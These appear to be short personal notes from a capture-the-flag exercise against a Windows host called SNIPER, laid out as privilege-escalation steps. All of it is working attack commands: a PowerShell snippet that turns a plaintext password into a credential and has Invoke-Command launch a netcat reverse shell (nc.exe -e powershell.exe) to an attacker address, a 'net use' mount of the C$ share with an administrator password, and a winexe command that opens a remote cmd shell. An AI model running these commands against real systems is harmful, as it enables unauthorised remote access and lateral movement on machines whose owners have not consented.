
## Escaladating from one user to another using netcat
```$user = "SNIPER\\Chris"```
```$password = "36mEAhz/B8xQ~2VM"```
```$securePassword = ConvertTo-SecureString $password -AsPlainText -Force```
```$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword```
```Invoke-Command -ComputerName SNIPER -Credential $credential -ScriptBlock { C:\tmp\nc.exe -e powershell.exe 10.10.16.22 5555}```

## Once I had the creds
```C:\inetpub\new-site>net use \\127.0.0.1\c$ /user:administrator "u6!4ZwgwOM#^OBf#Nwnh"```

## Or to get shell
```root@kali# winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe```
